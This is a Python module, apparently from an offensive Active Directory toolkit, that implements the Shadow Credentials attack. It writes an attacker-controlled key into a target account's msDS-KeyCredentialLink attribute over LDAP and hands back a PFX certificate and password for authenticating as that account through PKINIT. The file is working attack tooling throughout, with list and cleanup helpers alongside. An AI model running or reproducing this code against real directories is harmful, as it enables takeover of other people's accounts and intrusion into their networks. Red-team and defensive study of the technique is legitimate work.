"""Shadow Credentials attack — manipulate msDS-KeyCredentialLink to add a controlled key.

Based on the technique described in:
  https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
"""

from __future__ import annotations

import hashlib
import logging
import os
import struct
import uuid
from dataclasses import dataclass
from datetime import datetime, timezone

log = logging.getLogger(__name__)

# msDS-KeyCredentialLink entry tags (MS-ADTS 2.2.18.1)
_TAG_KEY_ID          = 0x01
_TAG_KEY_HASH        = 0x02
_TAG_KEY_MATERIAL    = 0x03  # DER-encoded SubjectPublicKeyInfo
_TAG_KEY_USAGE       = 0x04
_TAG_KEY_SOURCE      = 0x05
_TAG_DEVICE_ID       = 0x06
_TAG_CUSTOM_KEY_INFO = 0x07
_TAG_LAST_LOGON      = 0x08
_TAG_CREATION_TIME   = 0x09

_BLOB_VERSION = 0x00000200


@dataclass
class KeyCredential:
    device_id:  str      # GUID string
    key_id:     str      # SHA256-derived 16-byte ID as hex
    created:    datetime
    raw_blob:   bytes


def add(conn, target_dn: str) -> tuple[KeyCredential, bytes, str]:
    """Add a new Shadow Credential to target_dn.

    Generates a fresh RSA key pair, builds a KeyCredentialLink blob,
    and appends it to msDS-KeyCredentialLink.

    Returns:
        (KeyCredential metadata, pfx_bytes, pfx_password)

    The pfx_bytes can be used with Certipy or Rubeus to authenticate as the
    target via PKINIT.
    """
    from maul.auth.certificate import generate_self_signed_cert, cert_to_pfx

    device_id  = str(uuid.uuid4()).upper()
    pfx_pass   = _random_password()
    private_key, cert = generate_self_signed_cert(cn=f"ShadowCred-{device_id[:8]}")
    pfx_bytes  = cert_to_pfx(private_key, cert, pfx_pass)

    # Get DER-encoded public key
    from cryptography.hazmat.primitives import serialization
    pub_der = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    now        = datetime.now(timezone.utc)
    blob       = _build_blob(pub_der, device_id, now)
    key_id_hex = hashlib.sha256(pub_der).hexdigest()[:32]

    credential = KeyCredential(
        device_id=device_id,
        key_id=key_id_hex,
        created=now,
        raw_blob=blob,
    )

    _append_key_credential(conn, target_dn, blob, device_id)
    return credential, pfx_bytes, pfx_pass


def list_credentials(conn, target_dn: str) -> list[KeyCredential]:
    """Return all KeyCredential entries on target_dn."""
    raw_values = _read_key_credential_links(conn, target_dn)
    result: list[KeyCredential] = []
    for raw in raw_values:
        try:
            cred = _parse_blob_metadata(raw)
            if cred:
                result.append(cred)
        except Exception as exc:
            log.debug("Failed to parse KeyCredentialLink entry: %s", exc)
    return result


def remove(conn, target_dn: str, device_id: str) -> bool:
    """Remove the KeyCredential with matching device_id from target_dn.

    Returns True if found and removed, False if not found.
    """
    raw_values = _read_key_credential_links(conn, target_dn)
    kept: list[bytes] = []
    removed = False
    for raw in raw_values:
        cred = _parse_blob_metadata(raw)
        if cred and cred.device_id.upper() == device_id.upper():
            removed = True
        else:
            kept.append(raw)

    if removed:
        _write_key_credential_links(conn, target_dn, kept)
    return removed


# ── blob construction ─────────────────────────────────────────────────────────

def _entry(tag: int, value: bytes) -> bytes:
    """Build a single TLV entry: Length(2 LE) + Tag(1) + Value."""
    return struct.pack("<H", len(value)) + bytes([tag]) + value


def _filetime_now() -> bytes:
    """Current UTC time as 8-byte Windows FILETIME (100-ns intervals since 1601-01-01)."""
    ts = datetime.now(timezone.utc).timestamp()
    ft = int((ts + 11644473600) * 10_000_000)
    return struct.pack("<Q", ft)


def _build_blob(pub_der: bytes, device_id_str: str, now: datetime) -> bytes:
    """Assemble a complete KeyCredentialLink binary blob."""
    device_id_bytes = uuid.UUID(device_id_str).bytes_le  # GUID little-endian
    key_id = hashlib.sha256(pub_der).digest()[:16]       # 16-byte key identifier
    ft     = _filetime_now()

    # Build the payload entries (everything after KeyID and KeyHash)
    payload = (
        _entry(_TAG_KEY_MATERIAL,    pub_der)          +
        _entry(_TAG_KEY_USAGE,       b"\x01")           +  # 0x01 = NGC Key
        _entry(_TAG_KEY_SOURCE,      b"\x00")           +  # 0x00 = AD
        _entry(_TAG_DEVICE_ID,       device_id_bytes)   +
        _entry(_TAG_CUSTOM_KEY_INFO, b"\x01\x00")       +  # version 1, flags 0
        _entry(_TAG_LAST_LOGON,      ft)                +
        _entry(_TAG_CREATION_TIME,   ft)
    )

    key_hash = hashlib.sha256(payload).digest()

    return (
        struct.pack("<I", _BLOB_VERSION)     +
        _entry(_TAG_KEY_ID,   key_id)        +
        _entry(_TAG_KEY_HASH, key_hash)      +
        payload
    )


def _parse_blob_metadata(blob: bytes) -> KeyCredential | None:
    """Extract device_id, key_id, and creation timestamp from a blob."""
    try:
        if len(blob) < 4:
            return None
        version = struct.unpack_from("<I", blob, 0)[0]
        if version != _BLOB_VERSION:
            return None

        offset     = 4
        key_id_hex = ""
        device_id  = ""
        created    = datetime.now(timezone.utc)

        while offset + 3 <= len(blob):
            length = struct.unpack_from("<H", blob, offset)[0]
            tag    = blob[offset + 2]
            value  = blob[offset + 3: offset + 3 + length]
            offset += 3 + length

            if tag == _TAG_KEY_ID and len(value) >= 16:
                key_id_hex = value[:16].hex()
            elif tag == _TAG_DEVICE_ID and len(value) == 16:
                try:
                    device_id = str(uuid.UUID(bytes_le=value)).upper()
                except Exception:
                    device_id = value.hex()
            elif tag == _TAG_CREATION_TIME and len(value) == 8:
                ft = struct.unpack_from("<Q", value)[0]
                ts = ft / 10_000_000 - 11644473600
                try:
                    created = datetime.fromtimestamp(ts, tz=timezone.utc)
                except Exception:
                    pass

        return KeyCredential(
            device_id=device_id or "?",
            key_id=key_id_hex,
            created=created,
            raw_blob=blob,
        )
    except Exception as exc:
        log.debug("Blob parse error: %s", exc)
        return None


# ── LDAP read/write ───────────────────────────────────────────────────────────

def _read_key_credential_links(conn, target_dn: str) -> list[bytes]:
    """Return raw blob bytes for each msDS-KeyCredentialLink entry."""
    from maul.core.ldap_client import get_attr
    entries = conn.ldap_search(
        "(objectClass=*)",
        attributes=["msDS-KeyCredentialLink"],
        base=target_dn,
        scope="BASE",
    )
    if not entries:
        return []
    raw = get_attr(entries[0], "msDS-KeyCredentialLink") or []
    if isinstance(raw, (str, bytes)):
        raw = [raw]
    result: list[bytes] = []
    for v in raw:
        result.append(_decode_dn_with_binary(v))
    return result


def _decode_dn_with_binary(value) -> bytes:
    """Decode a DNWithBinary value to its binary blob component."""
    if isinstance(value, bytes):
        return value
    s = str(value)
    # Format: B:<byte_count>:<hex>:<dn>
    if s.startswith("B:"):
        parts = s.split(":", 3)
        if len(parts) >= 3:
            try:
                return bytes.fromhex(parts[2])
            except Exception:
                pass
    return s.encode("latin-1")


def _encode_dn_with_binary(blob: bytes, target_dn: str) -> str:
    """Encode blob + DN as a DNWithBinary string for LDAP write."""
    hex_blob = blob.hex()
    return f"B:{len(blob) * 2}:{hex_blob}:{target_dn}"


def _append_key_credential(conn, target_dn: str, blob: bytes, device_id: str) -> None:
    import ldap3
    conn._ensure_connected()
    encoded = _encode_dn_with_binary(blob, target_dn)
    changes = {"msDS-KeyCredentialLink": [(ldap3.MODIFY_ADD, [encoded])]}
    result = conn._ldap_conn.modify(target_dn, changes)
    if not result:
        raise RuntimeError(
            f"LDAP modify (add KeyCredentialLink) failed for {target_dn}: "
            f"{conn._ldap_conn.result.get('description', 'unknown')}"
        )


def _write_key_credential_links(conn, target_dn: str, blobs: list[bytes]) -> None:
    import ldap3
    conn._ensure_connected()
    if not blobs:
        changes = {"msDS-KeyCredentialLink": [(ldap3.MODIFY_DELETE, [])]}
    else:
        encoded = [_encode_dn_with_binary(b, target_dn) for b in blobs]
        changes = {"msDS-KeyCredentialLink": [(ldap3.MODIFY_REPLACE, encoded)]}
    result = conn._ldap_conn.modify(target_dn, changes)
    if not result:
        raise RuntimeError(
            f"LDAP modify (write KeyCredentialLinks) failed for {target_dn}: "
            f"{conn._ldap_conn.result.get('description', 'unknown')}"
        )


def _random_password(length: int = 20) -> str:
    """Generate a random alphanumeric password."""
    import string
    import secrets
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))
